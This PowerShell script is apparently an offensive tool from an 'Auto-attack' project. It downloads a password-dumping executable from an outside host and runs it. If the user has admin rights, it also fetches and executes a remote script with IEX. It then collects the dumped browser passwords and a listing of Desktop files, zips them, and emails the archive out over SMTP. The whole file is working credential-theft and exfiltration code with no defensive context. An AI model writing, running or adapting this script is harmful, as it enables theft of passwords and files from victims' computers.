

#SendToMail
function SendMail($Header,$Body,$FileSend,$user, $pass){
    
    $mail = New-Object System.Net.Mail.MailMessage
    $mail.From = New-Object System.Net.Mail.MailAddress($user,$user)
    $mail.To.Add($user)
    
    $mail.Subject = $Header
    $mail.Priority = 'high'

    if ($body){
    $mail.Body = $Body
    }
    else{
    $mail.Body = 'Browser Pass'
    }
    if ($FileSend){

    $filename = $FileSend
    $attachment =  new-Object System.Net.Mail.Attachment($filename)
    $mail.Attachments.Add($attachment)


    }

    $stmp  = New-Object System.Net.Mail.SmtpClient -ArgumentList 'smtp.163.com' #change to you mail's smtp server

    $stmp.Credentials = New-Object System.Net.NetworkCredential -argumentList $user,$pass
    $stmp.EnableSsl = 'True'
    $stmp.Timeout = '100000'
    try{
        $stmp.Send($mail)
        $mail.Attachments.Clear()
        echo 'success'
    }catch{
        echo 'fail'
    }


}

#zip files
function convertToZip($srcDir,$destFile){

    $srcdir = $srcDir
    $zipFile = $destFile

    if(test-path($zipFile)) {

        Remove-Item($zipFile)

        }

    set-content $zipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))

    (dir $zipFile).IsReadOnly = $false

    $shellApplication = new-object -com shell.application

    $zipPackage = $shellApplication.NameSpace($zipFile)

    $files = Get-ChildItem -Path $srcdir

    foreach($file in $files) {

        $zipPackage.CopyHere($file.FullName)

        while($zipPackage.Items().Item($file.name) -eq $null){

        Start-sleep -seconds 1 
    }

   }
   Remove-Item -Path $srcdir -Recurse
}

function getAllFile($dir){
    
    $files = Get-ChildItem -Path $dir
    foreach($file in $files){
        if ($file -isnot [System.IO.FileInfo]){
            getAllFile($file.FullName)
        }
        else{
            echo (Get-Item $file.FullName).Name
        }
    }

}

function getTMPPATH{
    $AppData = $env:LOCALAPPDATA
    if (Test-Path($AppData + "\Temp")){
        return $AppData + "\Temp"    
    }
    else {
        return $AppData
    }
}

$TMP = getTMPPATH
$admin = 'https://raw.githubusercontent.com/zp1in/Auto-attack/master/admin.ps1'
$uploadName = (Get-Item Env:\COMPUTERNAME).value+ (Get-Date).ToString('yMd') 


Write-Host "Downloading dump exe"
try{
(New-Object Net.Webclient).DownloadFile('http://lzp.org.cn/main.zip',$TMP+'\main.exe')
}catch{
if(Test-Path -Path ($TMP+'\main.exe')){
Remove-Item -Path ($TMP+'\main.exe')
}
Write-Host "Error Downloading dump exe, Retry once ....."
(New-Object Net.Webclient).DownloadFile('http://lzp.org.cn/main.zip',$TMP+'\main.exe')
}

sleep -Seconds 60

Write-Host "Starting dump PassWord"
$Pass = powershell -c ($TMP+'\main.exe')
Write-Host "Removing the dump exe"
Remove-Item ($TMP + '\main.exe')

if ([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")){
    Write-Host "Admin user now, Starting Invoke admin Process"
    IEX(New-Object Net.WebClient).DownloadString($admin)

}else{
Write-Host "Not Admin user, Pass this step"
}

$uploadDir = $TMP + '\' + $uploadName
$uploadDir = New-Item ($uploadDir) -ItemType Directory
echo $Pass > $uploadDir'\pass.txt'

#copy the file
$copyDir = (Get-ChildItem env:\userprofile).value + '\Desktop'
$copyToDir = New-Item $uploadDir'\Doc' -ItemType Directory
(Get-ChildItem $copyDir).Name > $copyToDir'\files.txt'
#Dir -filter *.txt -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
#Dir -filter *.doc -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
#Dir -filter *.docx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
#Dir -filter *.xls -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
#Dir -filter *.xlsx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
Write-Host "Converting to ZipFile"
convertToZip -srcDir $uploadDir -destFile ($TMP + '\' + $uploadName+'.zip')
Write-Host "Sending Email"
SendMail -Header $uploadName  -FileSend ($TMP + '\' + $uploadName + '.zip') -user 'test' -pass 'test'

